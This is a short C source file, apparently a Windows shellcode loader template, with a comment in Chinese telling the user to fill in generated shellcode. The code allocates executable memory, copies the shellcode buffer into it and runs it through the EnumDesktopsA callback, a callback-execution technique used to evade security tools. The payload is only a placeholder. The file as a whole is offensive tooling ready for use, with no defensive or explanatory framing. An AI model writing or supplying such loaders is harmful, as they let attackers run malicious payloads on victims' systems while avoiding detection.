#include <windows.h>

unsigned char shellcode[] =
"[Shellcode]";  //填充生成的Shellcode

int main(int argc, char* argv[]) {
  LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, shellcode, sizeof(shellcode));
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  return 0;
}
